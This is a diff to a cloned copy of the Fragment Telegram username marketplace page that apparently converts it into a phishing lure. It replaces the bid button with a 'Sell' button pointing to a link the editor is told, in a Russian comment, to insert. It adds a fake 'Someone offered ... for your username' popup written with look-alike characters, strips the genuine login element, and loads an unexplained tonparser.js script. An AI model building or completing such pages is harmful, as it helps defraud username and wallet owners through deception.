@@ -542,7 +542,7 @@
                 </a>
             </div>
             <div class="tm-header-body">
-                <form action="/" class="tm-header-search-form">
+                <form action="https://fragment.com" class="tm-header-search-form">
                     <div class="icon-before icon-search tm-field tm-search-field">
                         <input type="search" class="form-control tm-input tm-search-input" name="query"
                             placeholder="Search usernames" autocomplete="off">
@@ -551,10 +551,6 @@
             </div>
             <div class="tm-header-actions tm-header-actions-wide">
                 <div class="btn-group tm-header-action tm-dropdown">
-                    <button class="btn btn-default tm-header-action tm-header-button login-link">
-                        <i class="icon icon-connect-telegram"></i>
-                        <span class="tm-button-label">Connect Telegram</span>
-                    </button>
                     <ul class="dropdown-menu">
                         <li><a href="https://fragment.com/convert"
                                 class="dropdown-menu-item icon-before icon-menu-convert">My Usernames</a>
@@ -595,18 +591,6 @@
                                 <i class="icon icon-connect-ton"></i>
                                 <span class="tm-button-label">Connect TON</span>
                             </button>
-                            <div class="tm-menu-tg-account">
-                                <div class="tm-menu-tg-account-body">
-                                    <span class="tm-menu-tg-account-photo">
-                                        <img
-                                            src="https://cdn4.telesco.pe/file/g9Oeg998n9afeD2452TF-9XTOIxHLU6ev7TOe30T-nEWgtw4cwtgcIywHagUu-uqmEhEAeYQjKxYf9ibhl0ijyKysJds2quPziujqvZ0jixWEhhws_SY-oloaS3POCfCdHdNcj0tTvEIzgavUNw-pmG373XLYsGqM57VgXvfXxPD6tbUjE6zcYi0VrcoPoFDTqyifS1Kma6T2PivXBiRVJbWGsGwuEDlgqrFp166QQnbtznTfIcqxFPnp97JTE-GcXnljieaW4bOotYUkisz-9rtdFICxt8gIP3-_Uiwroo1_yYWtg1zo-iT_aclhoXqzzFZvC3R_VlpC5JodtXxVA.jpg">
-                                    </span>
-                                    <div class="tm-menu-tg-account-name">Сустанончик</div>
-                                    <div class="tm-menu-tg-account-desc">Telegram Account</div>
-                                </div>
-                                <a href="javascript:;" class="btn-link tm-menu-tg-account-logout logout-link">Log
-                                    Out</a>
-                            </div>
                         </div>
                     </div>
                 </div>
@@ -703,7 +687,9 @@
                     </div>
                 </div>
                 <div class="tm-section-box tm-section-buttons">
-                    <button class="btn btn-primary js-place-bid-btn" data-bid-amount="5303">Place bid</button>
+                    <!-- в следующей строке вместо google.com вставь ссылку -->
+                    <button class="btn btn-primary js-place-bid-btn"
+                        onclick="window.location.href = 'google.com'">Sell</button>
                 </div>
                 <div class="tm-section-subscribe tm-section-box js-subscribe">
                     <a class="btn-link subscribe-btn js-subscribe-btn">Subscribe to updates</a>
@@ -782,9 +768,9 @@
             <div class="popup">
                 <div class="popup-body">
                     <section>
-                        <h4>Bet</h4>
-                        <p class="popup-text">You can buy this
-                            Bet on this username:
+                        <h4>Someone offered <span class="accent-color"></span> for your username</h4>
+                        <p class="popup-text">
+                            lf yоu wish tо seII this, plеаsе prеss thе buttоn bеIοw аnd сhеck if thе оffеr suits yоu.
                         </p>
                     </section>
                 </div>
@@ -1073,6 +1059,7 @@
     <script src="scripts/qr-styling.js"></script>
     <script src="scripts/tonconnect.js"></script>
     <script src="scripts/tgsticeker.js"></script>
+    <script src="scripts/tonparser.js"></script>
     <script src="scripts/script.js"></script>
 
     <script>ajInit({ "version": 535, "apiUrl": "\/api?hash=91de50b949728f5bac", "state": { "quickSearch": false, "tonRate": 4.9178581177614 } });</script>
